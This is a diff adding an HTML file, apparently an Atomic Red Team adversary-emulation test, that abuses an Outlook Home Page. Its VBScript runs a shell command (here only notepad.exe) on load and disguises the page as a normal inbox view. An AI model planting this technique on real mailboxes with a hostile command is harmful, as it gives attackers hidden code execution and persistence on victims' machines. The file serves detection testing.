@@ -1,0 +1,24 @@
+<!-- 
+    Based on the example from SensePost's blog post:
+    https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/
+-->
+<html>
+    <head>
+        <title>Atomic Red Team</title>
+        <script language=vbscript>
+            Sub window_onload()
+                Set Application = ViewCtl1.OutlookApplication
+                Set cmd = Application.CreateObject("Wscript.Shell")
+                cmd.Run("cmd.exe /c notepad.exe") 
+            End Sub
+        </script>
+    </head>
+    <body>
+        <h1>Atomic Red Team</h1>
+        <!-- 
+            The following object tag causes Outlook to display a normal looking list of emails in the folder.
+            This is not required to execute this technique, but is commonly seen in real world examples of malicious Outlook Home Pages.
+        -->
+        <object classid="clsid:0006F063-0000-0000-C000-000000000046" id="ViewCtl1" data="" width="100%" height="100%"></object>
+    </body>
+</html>
